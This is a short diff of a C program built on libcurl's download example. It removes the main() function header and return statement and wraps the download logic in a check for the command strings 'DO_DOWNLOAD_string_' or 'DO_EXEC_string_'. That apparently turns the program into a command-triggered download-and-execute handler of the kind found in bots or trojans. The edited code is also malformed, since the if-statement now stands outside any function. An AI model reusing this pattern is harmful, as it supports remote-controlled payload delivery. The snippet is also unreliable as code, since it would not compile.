@@ -10,9 +10,8 @@ static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
   return written;
 }
 
-int main()
-{
 
+if(strcmp(buf,"DO_DOWNLOAD_string_") == 0 || strcmp(buf,"DO_EXEC_string_") == 0){
   CURL *curl_handle;
   static const char *pagefilename = "downloadedfile";
   FILE *pagefile;
@@ -45,5 +44,4 @@ int main()
 
   curl_global_cleanup();
 
-  return 0;
 }
